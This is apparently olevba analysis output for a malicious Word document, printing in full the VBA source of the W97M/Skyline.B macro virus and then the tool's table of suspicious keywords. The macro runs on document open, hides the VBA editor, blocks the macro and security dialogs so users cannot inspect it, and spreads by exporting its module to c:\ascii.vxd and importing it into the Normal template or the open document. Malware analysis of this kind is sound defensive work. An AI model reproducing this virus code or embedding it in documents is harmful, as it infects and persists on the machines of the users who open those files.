olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wrench.e-6896c50f9b51e838ccc5543bd909538bd4a23a88
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wrench.e-6896c50f9b51e838ccc5543bd909538bd4a23a88 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: Virus.MSWord.Wrench.e-6896c50f9b51e838ccc5543bd909538bd4a23a88 - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
Carrier(ModulName).Export "c:\ascii.vxd"
host.Import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Wrench.e-6896c50f9b51e838ccc5543bd909538bd4a23a88 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Makro1()
Attribute Makro1.VB_Description = "Makro aufgezeichnet am 21.05.00 von Consent"
Attribute Makro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro1"
'
' Makro1 Makro
' Makro aufgezeichnet am 21.05.00 von Consent
'
    CommandBars("Stop Recording").Visible = False
End Sub
Sub Makro2()
Attribute Makro2.VB_Description = "Makro aufgezeichnet am 22.05.00 von Consent"
Attribute Makro2.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro2"
'
' Makro2 Makro
' Makro aufgezeichnet am 22.05.00 von Consent
'
    CommandBars("Stop Recording").Visible = False
End Sub
Sub Makro3()
Attribute Makro3.VB_Description = "Makro aufgezeichnet am 22.05.00 von Consent"
Attribute Makro3.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro3"
'
' Makro3 Makro
' Makro aufgezeichnet am 22.05.00 von Consent
'
    CommandBars("Stop Recording").Visible = False
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

